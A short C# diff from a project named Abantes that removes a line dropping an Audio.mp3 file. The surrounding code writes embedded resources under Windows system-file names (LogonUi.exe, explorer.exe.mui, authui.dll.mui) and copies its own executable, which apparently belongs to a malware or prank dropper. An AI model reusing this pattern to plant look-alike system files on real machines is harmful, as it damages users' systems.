@@ -49,7 +49,6 @@ namespace Abantes
                 File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
                 File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
                 File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
-                File.WriteAllBytes(extractPath + "\\Audio.mp3", Resources.Audio);
                 File.WriteAllBytes(extractPath + "\\data.bin", Resources.data);
                 Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
